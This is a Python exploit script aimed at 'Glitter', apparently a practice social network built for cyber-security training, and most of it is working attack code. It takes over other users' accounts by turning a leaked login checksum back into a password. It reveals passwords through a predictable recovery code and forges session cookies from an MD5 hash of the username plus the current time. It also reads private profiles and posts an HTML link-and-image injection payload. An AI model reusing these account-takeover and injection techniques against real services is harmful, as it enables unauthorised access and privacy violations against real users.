from scapy.all import*
import socket
import requests as rq
import datetime as dt
import hashlib as h

SERVER_IP = '54.187.16.171'
SERVER_PORT = 1336
URL = 'http://cyber.glitter.org.il'

UPPER_CASE = 65 #65 -> A(dec value in ASCII table)

LOG_100 = '100#{gli&&er}{"user_name":"","password":"","enable_push_notifications":true}##'
LOG_110 = '110#{gli&&er}##'
LOG_310 = '310#{gli&&er}##'
LOG_440 = '440#{gli&&er}##'
LOAD_POST_500 = '500#{gli&&er}{"feed_owner_id":,"end_date":"","glit_count":}##'
LIKE_MSG = '710#{gli&&er}{"glit_id":,"user_id":,"user_screen_name":"","id":-1}##'
UNLIKE_MSG = '720#{gli&&er}##'
COMMENT_MSG = '650#{gli&&er}{"glit_id":,"user_id":,"user_screen_name":"","id":-1,"content":"","date":""}##'
POST_MSG = '550#{gli&&er}{"feed_owner_id":,"publisher_id":,"publisher_screen_name":"","publisher_avatar":"","background_color":"","date":"","content":"","font_color":"black","id":-1}##'
S_300 = '300#{gli&&er}{"search_type":"SIMPLE","search_entry":""}##'
VISIT_HISTORY = '320#{gli&&er}##'
WOW_MSG = '750#{gli&&er}{"user_screen_name":"","user_id":,"glit_id":}##'
UNWOW_MSG = '760#{gli&&er}##'
REFUSE_FRIENDSHIP_430 = '430#{gli&&er}[]##'
SEND_FRIENDSHIP_410 = '410#{gli&&er}[]##'
APPROVE_FRIENDSHIP_420 = '420#{gli&&er}[]##'
EDIT_POST = '350#{gli&&er}{"screen_name":"","avatar":"im1","description":"no.","privacy":"Private","id":,"user_name":"qqqqqa","password":"12","gender":"Female","mail":"u@gmail.com"}##'
LOGOUT_200 = '200#{gli&&er}##'

CRY_BANANA_CAT = 'https://i.pinimg.com/564x/72/b9/54/72b95402a1dafcab917dec6895f6a7ab.jpg'
DISSATISFIED_CAT = 'https://i.pinimg.com/564x/dc/4e/98/dc4e982c00de9a5549777447bda09fed.jpg'
SIDE_EYE_CAT = 'https://i.pinimg.com/564x/46/e3/a2/46e3a21b543e882f36b6eeb220f1a0df.jpg' 
CAT_PHOTO_OP = [CRY_BANANA_CAT, DISSATISFIED_CAT,SIDE_EYE_CAT]

def cat_photo_op():
    '''
    The func is sending the current link of photo that user want to post
    return: link of photo
    :rtype: string
    '''
    op = int(input('Which cat photo you want to post:\n[1] Cry banana cat\n[2] Dissatisfied cat\n[3] Side eye cat\n'))
    op -= 1
    return CAT_PHOTO_OP[op]

def date_field():
    '''
    The func is getting the current date
    return: date of today
    :rtype: string
    '''
    curr_date = dt.datetime.now()
    curr_date = str(curr_date).replace(' ','T')
    curr_date = curr_date[:-4] + 'Z'
    return curr_date

def print_posts(posts):
    '''
    The func arrange the message from the server and prints all the posts
    :param posts: the msg from the server (request 500)
    :type posts: string
    '''
    print("Feed loading approved\nHere's list of post: ")
    posts = posts[posts.index('[')+1:posts.index(']')]
    posts = posts.split('},')
    posts = [i.split(',') for i in posts]
    index = 0
    for i in posts:
        index += 1
        temp = i[6]
        print('Post number ' + str(index) + ': his content =>' + temp[temp.index(':')+2:-1])
    print('')

def calc_checksum(name, password):
    '''
    The func is calculating checksum
    :param name: username that we got
    :param password: password from the input
    :type name: string
    :type password: stirng
    return: sum of ascii values from username and password
    :rtype: stirng
    '''
    name_sum = sum(map(ord, name))
    pass_sum = sum(map(ord, password))
    return str(name_sum + pass_sum)

def find_password_app(checksum):
    '''
    The func is calculates the password of the user
    :param checksum: sum of the username and password
    :type checksum: string
    '''
    min_ascii_val = 33 #min ascii val that is note
    max_ascii_val = 126 #max ascii val that is note
    password = ''
    checksum1 = checksum
    while checksum > 0:
        ascii_value = random.randint(min_ascii_val, max_ascii_val)  
        if checksum - ascii_value >= 0 and ascii_value != '"':
            password += chr(ascii_value) 
            checksum -= ascii_value
        else:
            password = ""
            checksum = checksum1 #in case that the func wouldn't find the correct sum of values it would start the search again
    return password

def search_id(sock, name):
    '''
    The func searching the id of user
    :param sock: socket that we opened
    :param name: name of the profile
    :param user_id: current user id
    :type sock: socket
    :type name: string
    :type user_id: string
    '''
    search_msg = S_300
    search_msg = search_msg[:53] + name + search_msg[53:]
    sock.sendall(search_msg.encode())
    recv_msg = sock.recv(1024).decode()
    if '[]' in recv_msg:
        return 'wrong username'
    new_id = recv_msg.index('"id"')
    new_id = recv_msg[new_id+5:recv_msg.index(',',new_id)]
    return new_id

def login(sock, name, password):
    '''
    The func does login to the server
    :param sock: socket that we opened
    :param name: name of the profile
    :type sock: socket
    :type name: string
    '''
    log_100 = LOG_100
    log_110 = LOG_110
    log_310 = LOG_310
    log_440 = LOG_440
    log_100 = log_100[:27] + name + log_100[27:41] + password + log_100[41:]
    sock.sendall(log_100.encode())
    recv_msg = sock.recv(1024).decode()
    if '108#' in recv_msg or '109' in recv_msg: #checking if got error from the login message
        print('Wrong user or password')
        print('')
        return ' ',' '
    log_110 = log_110[:13] + calc_checksum(name, password) + log_110[13:]
    sock.sendall(log_110.encode())
    recv_msg = sock.recv(1024).decode()
    password = recv_msg[recv_msg.index('password')+11:recv_msg.index('"',recv_msg.index('password')+13)]
    log_id = recv_msg.index('"id"')
    log_id = recv_msg[log_id+5:recv_msg.index(',',log_id)]
    log_310 = log_310[:13] + log_id + log_310[13:]
    sock.sendall(log_310.encode())
    sock.recv(1024).decode()
    log_440 = log_440[:13] + log_id + log_440[13:]
    sock.sendall(log_440.encode())
    sock.recv(1024).decode()
    return log_id, password
    
def login_to_other_user(sock, curr_user,name):
    '''
    The func does login to the other user that we don't know his password and checksum (in short hacking the requerd user)
    :param sock: socket that we opened
    :param curr_user: surrent user that is logged
    :param name: name of the profile
    :type sock: socket
    :type curr_user: string
    :type name: string
    '''
    curr_id = search_id(sock, curr_user)
    if 'wrong' in curr_id:
        print('wrong user!')
        return '_'
    logout = LOGOUT_200
    logout = logout[:13] + curr_id + logout[13:]
    sock.sendall(logout.encode())
    sock.recv(1024).decode()
    first_try = LOG_100[:27] + name + LOG_100[27:LOG_100.index(':',28)+2] + 'qw' + LOG_100[LOG_100.index(':',28)+2:]
    sock.sendall(first_try.encode())
    recv_msg = sock.recv(1024).decode()
    checksum = recv_msg[recv_msg.index(':')+2:recv_msg.index('{')]
    checksum = int(checksum) - sum(map(ord, name)) #calculate the password value
    password = find_password_app(int(checksum))
    return login(sock, name, password)

def get_all_post(sock, username):
    '''
    The func is finding all the post that exist on the page
    :param sock: socket that we opened
    :param username: username that we got
    :type sock: socket
    :type username: string
    return: list of ides
    :rtype: list
    '''
    all_post = load_user_profile_info(sock, username, '100')
    if all_post == '_': #if not found
        return '_'
    try:
        all_post = all_post[all_post.index('glits')+8:all_post.index(',"commentsMap"')]
    except Exception:
        return '_'
    all_post = all_post.split(',')
    posts_id = []
    for i in all_post:
        if '"id"' in i:
            posts_id.append(i[i.index(':')+1:i.index('}')])
    return posts_id

def choose_post(sock, username):
    '''
    The func is getting all post from required user and return the required post
    :param sock: socket that we opened
    :param username: username that we got
    :type sock: socket
    :type username: string
    return: id of required post
    :rtype: string
    '''
    all_post_id = get_all_post(sock, username)
    if all_post_id == '_': #if not found
        return '_'
    post_count = str(len(all_post_id))
    post_number = input('Enter number of post(there is ' + post_count + ' post): ')
    while int(post_number) > int(post_count):
        post_number = input('Try again\nThere is ' + post_count + 'post: ')
    
    return all_post_id[int(post_number)-1]
    
def do_like(sock, post_id, user_id, username_screen):
    '''
    The func does like to post
    :param sock: socket that we opened
    :param post_id: which post we going to write a comment
    :param user_id: current user we use
    :param username_screen: name of someone(can be the current user or someone else)
    :type sock: socket
    :type post_id: string
    :type user_id: string
    :type username_screen: string
    '''
    edited_like_msg = LIKE_MSG
    edited_like_msg = edited_like_msg[:24] + post_id + edited_like_msg[24:35] + user_id + edited_like_msg[35:56] + username_screen + edited_like_msg[56:]
    sock.sendall(edited_like_msg.encode())
    sock.recv(1024).decode()
    print('Like published')
    print('')

def do_comment(sock, post_id, user_id, username_screen, comment):
    '''
    The func does comment under post
    :param sock: socket that we opened
    :param post_id: which post we going to write a comment
    :param user_id: current user we use
    :param username_screen: name of someone(can be the current user or someone else)
    :param comment: the message we want to write
    :type sock: socket
    :type post_id: string
    :type user_id: string
    :type username_screen: string
    :type comment: string
    '''
    edited_comment_msg = COMMENT_MSG
    curr_date = date_field()
    edited_comment_msg = edited_comment_msg[:24] + post_id + edited_comment_msg[24:35] + user_id + edited_comment_msg[35:56] + username_screen + edited_comment_msg[56:77] + comment + edited_comment_msg[77:87] + curr_date + edited_comment_msg[87:]
    sock.sendall(edited_comment_msg.encode())
    sock.recv(1024).decode()
    print('Comment published')
    print('')

def do_post(sock, feed_id, publisher_id , publisher_name, publisher_ava, background, msg):
    '''
    The func does post
    :param sock: socket that we opened
    :param feed_id: id of the user feed we want to post 
    :param publisher_id: id of the user we want to post 
    :param publisher_name: username
    :param publisher_ava: profile photo
    :param background: color of the post
    :param msg: the message of the post
    :type sock: socket
    :type feed_id: string
    :type publisher_id: string
    :type publisher_name: string
    :type publisher_ava: string
    :type background: string
    :type msg: string
    '''
    edited_post_msg = POST_MSG
    curr_date = date_field()
    edited_post_msg = edited_post_msg[:30] + feed_id + edited_post_msg[30:46] + publisher_id + edited_post_msg[46:72] + publisher_name + edited_post_msg[72:94] + publisher_ava + edited_post_msg[94:116] + background + edited_post_msg[116:126] + curr_date + edited_post_msg[126:139] + msg + edited_post_msg[139:]
    sock.sendall(edited_post_msg.encode())
    sock.recv(1024).decode()
    print('Post published')
    print('')

def edit_post(sock, feed_id, publisher_id , publisher_name, publisher_ava, background, msg, post_id, font_color='black'):
    '''
    The func does edit an existing post
    :param sock: socket that we opened
    :param feed_id: id of the user feed we want to post 
    :param publisher_id: id of the user we want to post 
    :param publisher_name: username
    :param publisher_ava: profile photo
    :param background: color of the post
    :param msg: the message of the post
    :param post_id: id of requered post
    :param font_color: color of letters in post
    :type sock: socket
    :type feed_id: string
    :type publisher_id: string
    :type publisher_name: string
    :type publisher_ava: string
    :type background: string
    :type msg: string
    :type post_id: string
    :type font_color: string
    '''
    edited_post_msg = POST_MSG
    curr_date = date_field()
    edited_post_msg = edited_post_msg[:30] + feed_id + edited_post_msg[30:46] + publisher_id + edited_post_msg[46:72] + publisher_name + edited_post_msg[72:94] + publisher_ava + edited_post_msg[94:116] + background + edited_post_msg[116:126] + curr_date + edited_post_msg[126:139] + msg + edited_post_msg[139:]
    edited_post_msg = edited_post_msg.replace('-1', post_id)
    edited_post_msg = edited_post_msg.replace('black', font_color)
    sock.sendall(edited_post_msg.encode())
    sock.recv(1024).decode()
    print('Post edited')
    print('')

def load_user_profile_info(sock, username,post_count=100):
    '''
    The func is loading posts from profiles no matter if they are private or public
    :param sock: socket that we opened
    :param username: name of the user we want to load
    :param post_count: count of post we want to see
    :type sock: socket
    :type username: string
    :type post_count: string
    return: all posts of user
    :rtype:string
    '''
    user_id = search_id(sock, username)
    if 'wrong' in user_id: #if not found 
        print('wrong user!')
    load_post_msg = LOAD_POST_500
    curr_date = date_field()
    load_post_msg = load_post_msg[:30] + user_id + load_post_msg[30:43] + curr_date + load_post_msg[43:58] + str(post_count) + load_post_msg[58:]
    sock.sendall(load_post_msg.encode())
    recv_msg = sock.recv(100000000).decode()
    return recv_msg

def search_by_id(sock, id_to_search):
    '''
    The func does search by id
    :param sock: socket that we opened
    :param id_to_search: required id
    :type sock: socket
    :type id_to_search: string
    '''
    search = S_300
    search = search.replace('SIMPLE', 'ID')
    search = search[:49] + id_to_search + search[49:]
    sock.sendall(search.encode())
    recv_msg = sock.recv(1024).decode()
    user_info = recv_msg[recv_msg.index('{',35)+1:recv_msg.index('}',35)]
    user_info = user_info.split(',')
    user_info = [i.split(':') for i in user_info]
    print('Finded user: ')
    for i in user_info:
        i[0] = i[0].replace('"','')
        i[1] = i[1].replace('"','')

    for i in user_info:
        print(i[0] + ' => ' + i[1])
    print('')

def wow(sock, username, user_id, glit_id):
    '''
    The func is publish wow to any post and user required
    :param sock: socket that we opened
    :param username: required user
    :param user_id: user number
    :param glit_id: required post
    :type sock: socket
    :type username: stirng
    :type user_id: string
    :type glit_id: string
    '''
    wow_msg = WOW_MSG
    wow_msg = wow_msg[:wow_msg.index('""')+1] + username + wow_msg[wow_msg.index('""')+1:wow_msg.index(':,')+1] + user_id + wow_msg[wow_msg.index(':,')+1:wow_msg.index(':}')+1] + glit_id + wow_msg[wow_msg.index(':}')+1:]
    sock.sendall(wow_msg.encode())
    sock.recv(1024).decode()
    print('Wow published well')
    print('')

def users_visited_profiles(sock, user_id):
    '''
    The func is showing all users that required user
    :param sock: socket that we opened
    :param user_id: number of user
    :type sock: socket
    :type user_id: string
    '''
    rq_320 = VISIT_HISTORY
    rq_320 = rq_320[:rq_320.index('}')+1] + user_id + rq_320[rq_320.index('}')+1:]
    sock.sendall(rq_320.encode())
    recv_msg = sock.recv(1024).decode()
    print("Entities history fetched succesfully\nHere's list off users that required user entered: ")
    recv_msg = recv_msg[recv_msg.index('[')+1:recv_msg.index(']')]
    recv_msg = recv_msg.split('},')
    recv_msg = [i.split(',') for i in recv_msg]
    for i in recv_msg:
        temp = i[0]
        print('-' + temp[temp.index(':')+2:-1])
    print('')

def load_users_details(sock, user_id):
    '''
    The func is loading the messages that sended to the user
    :param sock: socket that we opened
    :param user_id: number of user
    :type sock: socket
    :type user_id: string
    '''
    load_msg = LOG_440
    load_msg = load_msg[:load_msg.index('}')+1] + user_id + load_msg[load_msg.index('}')+1:]
    sock.sendall(load_msg.encode())
    recv_msg = sock.recv(1024).decode()
    glance_rq = recv_msg[recv_msg.index(':[')+15:recv_msg.index('],')-1]
    if 'id' not in glance_rq: #if user don't have any glance request
        print('No glance reguest found')
    else:
        glance_rq = glance_rq[glance_rq.index('{')+1:]
        glance_rq = glance_rq.split('}')
        glance_rq = [i.split(',') for i in glance_rq]
        print('User that in waiting list: ')
        for i in glance_rq:
            temp = i[0]
            if 'screen_name' in temp:
                print('-' + temp[temp.index('name":"')+7:-1])
    push_updates = recv_msg[recv_msg.index('pushUpdates')+13:recv_msg.index(']}')+1]
    if push_updates == "[]": #if user don't have any updates to do
        print('No updates are needed')
    else:
        pass
    print('')

def refuse_glanceship(sock, user_id1, user_id2):
    '''
    The func is sending the refuse glanceship to the server
    :param sock: socket that we opened
    :param user1: first user id
    :param user2: second user id
    :type sock: socket
    :type user1: string
    :type user2: string
    '''
    refuse_msg = REFUSE_FRIENDSHIP_430
    refuse_msg = refuse_msg[:refuse_msg.index('[')+1] + user_id1 + ',' + user_id2 + refuse_msg[refuse_msg.index('[')+1:]
    sock.sendall(refuse_msg.encode())
    sock.recv(1024).decode()
    print('Refuse message recieved')
    print('')

def update_profile(sock,user_screen_name, the_id):
    '''
    The func is finding the username by the id
    :param sock: socket that we opened
    :param user_screen_name: curr user
    :param the_id: id that we got from the client
    :type sock: socket
    :type user_screen_name: string
    :type the_id: string
    '''
    update_msg = EDIT_POST
    update_msg = update_msg[:29] + user_screen_name + update_msg[29:91] + the_id + update_msg[91:]
    sock.sendall(update_msg.encode())
    recv_msg = sock.recv(1024).decode()
    if 'error' in recv_msg: #if not found
        print('user not found')
    else:
        username = recv_msg[recv_msg.index(': ')+2:recv_msg.index('{')]
        print(username)
    print('')

def find_cookie(username):
    '''
    The func is finding the cookie by the time and the username
    :param username: requested username to find thier cookie
    :type username: string
    return: cookie
    :rtype: string
    '''
    second_p = h.md5(username.encode()).hexdigest()
    date = str(dt.datetime.now())
    first_last_p = date[:date.index(' ')].split('-')
    first_last_p = first_last_p[2] + first_last_p[1] + first_last_p[0]
    third_p = date[date.index(' ')+1:16]
    third_p = third_p.replace(':','')
    if third_p.find('0') == 2:
        third_p = third_p[:2] + third_p[3:]
    return first_last_p + '.' + second_p + '.' + third_p + '.' + first_last_p

def approving_glance_rq(sock, user_id1, user_id2):
    '''
    The func is sending glance request and approve it
    :param sock: socket that we opened
    :param user1: first user id
    :param user2: second user id
    :type sock: socket
    :type user1: string
    :type user2: string
    '''
    glanceship_rq = SEND_FRIENDSHIP_410
    glanceship_rq = glanceship_rq[:glanceship_rq.index('[')+1] + user_id1 + ',' + user_id2 + glanceship_rq[glanceship_rq.index('[')+1:]
    sock.sendall(glanceship_rq.encode())
    glanceship_rq = APPROVE_FRIENDSHIP_420
    glanceship_rq = glanceship_rq[:glanceship_rq.index('[')+1] + user_id1 + ',' + user_id2 + glanceship_rq[glanceship_rq.index('[')+1:]
    sock.sendall(glanceship_rq.encode())
    sock.recv(1024).decode()
    print('Glance request approved,from now you are friends')
    print('')

def find_wows(sock,username):
    '''
    The func is finding all wows in the user profile
    :param sock: socket that we opened
    :param username: requered username from client
    :type sock: socket
    :type username: string
    return: all ides of wow
    :rtype: string
    '''
    wowMap = load_user_profile_info(sock, username)
    wowMap = wowMap[wowMap.index('wowsMap'):wowMap.index("}##")-2]
    wowMap = wowMap.split('],')
    wowMap_list = []
    for i in wowMap:
        if 'id' in i:
            the_id = i[i.index('"id"')+5:i.index(',',i.index('"id"')+5)]
            wowMap_list.append(the_id)
    post_n = input('Choose post from '+ str(len(wowMap_list)) + ': ')
    return wowMap_list[int(post_n)-1]
    
def unwow(sock, username):
    '''
    The func is deleting wow from the requered wow
    :param sock: socket that we opened
    :param username: requered username from client
    :type sock: socket
    :type username: string
    '''
    wow_id = find_wows(sock, username)
    unwow_msg = UNWOW_MSG
    unwow_msg = unwow_msg[:unwow_msg.index('}')+1] + wow_id + unwow_msg[unwow_msg.index('}')+1:]
    sock.sendall(unwow_msg.encode())
    sock.recv(1024).decode()
    print('Wow deleted')
    print('')

def find_likes(sock, username):
    '''
    The func is finding all likes in the user profile
    :param sock: socket that we opened
    :param username: requered username from client
    :type sock: socket
    :type username: string
    '''
    likesMap = load_user_profile_info(sock, username)
    likesMap = likesMap[likesMap.index('likesMap'):likesMap.index("wowsMap")-2]
    likesMap = likesMap.split('],')
    likesMap_list = []
    for i in likesMap:
        if 'id' in i:
            the_id = i[i.index('"id"')+5:i.index(',',i.index('"id"')+5)]
            likesMap_list.append(the_id)
    post_n = input('Choose post from '+ str(len(likesMap_list)) + ': ')
    return likesMap_list[int(post_n)-1]

def unlike(sock, username):
    '''
    The func does unlike forom requered like
    :param sock: socket that we opened
    :param username: requered username from client
    :type sock: socket
    :type username: string
    '''
    like_id = find_likes(sock, username)
    unlike_msg = UNLIKE_MSG
    unlike_msg = unlike_msg[:unlike_msg.index('}')+1] + like_id + unlike_msg[unlike_msg.index('}')+1:]
    sock.sendall(unlike_msg.encode())
    sock.recv(1024).decode()
    print('Like deleted')
    print('')

def encrypt_user_id(the_id, key=17):
    '''
    The func is encrypt the id for recover password message
    :param the_id: required id
    :param key: encryption key
    :type the_id: string
    :type key: int
    return: encrypted id
    :rtype: string
    '''
    msg = the_id
    encrypted_id = ''
    for c in msg:
        encrypted_c = chr((ord(c) - UPPER_CASE + key) % 26 + UPPER_CASE) 
        encrypted_id += encrypted_c
    return encrypted_id

def reset_password_msg(the_id):
    '''
    The func is creating the password from the recover message
    :param the_id: encrypted id
    :type the_id: string
    return: password from recover message
    :rtype: string
    '''
    date = str(dt.datetime.now())
    date_1 = date[:date.index(' ')].split('-')
    date_1 = date_1[2] + date_1[1]
    date_2 = date[date.index(' ')+1:16]
    date_2 = date_2.replace(':','')
    return date_1 + the_id + date_2

def find_password_web(username, reset_password):
    '''
    The func finds the password of required user
    :param username: required username
    :param reset_password: encrypted id
    :type username: string
    :type reset_password: string
    '''
    #sending the request for reseting the password
    url = URL + '/password-recovery-code-request/'
    headers = {
        "Host": "cyber.glitter.org.il",
        "Connection": "keep-alive",
        "Content-Length": "50",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": URL,
        "Referer": url,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6"
    }
    data = '"' + username + '"'
    res = rq.post(url, headers=headers, data=data)

    #sending the varification for reseting the password
    url = URL + '/password-recovery-code-verification/'
    headers = {
        "Host": "cyber.glitter.org.il",
        "Connection": "keep-alive",
        "Content-Length": "50",
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": URL,
        "Referer": url,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6"
    }
    data = '["' + username + '","' + reset_password + '"]'
    res = rq.post(url, headers=headers, data=data)
    res = res.text
    html = res.replace('"','')
    print('The password of user ' + username + ' is: ' + html)
    print('')

def do_xss(sock, username,the_id, other_id):
    '''
    The func is posting xss post 
    :param sock: socket that we opened
    :param username: required username to post the post
    :param the_id: required id to post the post
    :param other_id: id of user that has the current user
    :type sock: socket
    :type username: string
    :type the_id: string
    :type other_id: string
    '''
    cat_photo = cat_photo_op()
    msg = '<a href=http://cyber.glitter.org.il/glit?id=-1&feed_owner_id=-1&publisher_id=-1&publisher_screen_name=qwaqwa&publisher_avatar=im1&background_color=pink&date=' + date_field() + '&content=WWWOOOWWW&font_color=black><img src=' + cat_photo + ' width=104 height=142></a>'
    post_msg = '550#{gli&&er}{"feed_owner_id":,"publisher_id":,"publisher_screen_name":"","publisher_avatar":"","background_color":"","date":"","content":"","font_color":"black","id":-1}##'
    post_msg = post_msg[:30] + the_id + post_msg[30:46] + other_id + post_msg[46:72] + username + post_msg[72:94] + 'im1' + post_msg[94:116] + 'White' + post_msg[116:126] + date_field() + post_msg[126:139] + msg + post_msg[139:]
    sock.sendall(post_msg.encode())
    sock.recv(1024).decode()
    print('Post upload successfully')
    print('')